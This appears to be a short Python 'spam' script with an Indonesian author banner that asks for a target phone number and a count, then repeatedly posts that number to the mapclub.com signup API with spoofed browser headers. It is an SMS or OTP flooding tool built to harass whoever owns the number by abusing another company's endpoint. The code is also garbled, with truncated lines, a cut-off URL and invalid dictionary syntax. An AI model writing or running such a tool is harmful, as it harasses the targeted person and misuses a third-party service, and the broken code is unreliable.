import json
import requests
import sys
import os

def main():
        os.system('clear')
        os.system('figlet ini kakang')
        banner='''                                              

        [+]AUTHOR :kakang rusrus
        [+]Instagram : terlanjurngantuk
        '''

        print(banner)
        no = input('target : ')
        jum = input('jumlah spam : ')                           
        head = {                                                        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F>
        "Referer": "https://www.mapclub.com/en/user/signup",
        "Host": "cmsapi.mapclub.com",
        }


        dat = {
        'phone' = no
                                                                        for x in range(int(jum)):
                leosureo = requests.post("https://cmsapi.mapclu>
        if 'eror' in leosureo:
                print('gagal mengirim' + no)
        else:
                print('succses mengirim' + no)



main()
